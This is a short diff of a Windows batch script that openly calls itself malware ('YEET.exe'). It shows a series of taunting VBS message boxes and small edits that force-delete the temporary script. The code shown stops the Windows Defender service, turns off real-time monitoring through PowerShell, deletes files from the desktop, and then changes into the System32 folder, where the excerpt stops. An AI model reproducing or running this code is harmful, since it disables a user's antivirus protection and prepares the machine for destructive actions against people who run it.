@@ -1,15 +1,18 @@
 @echo off
 echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
+del yt.vbs /f
 taskkill /f /im YEET.exe
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
+del yt.vbs /f
 echo x=msgbox("yes, this malware can run even if it is deleted!",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
+del yt.vbs /f
 echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
-del yt.vbs
+del yt.vbs /f
 sc stop WinDefend
 powershell set-mppreference -disablerealtimemonitoring $true
 cd C:\Windows\System32
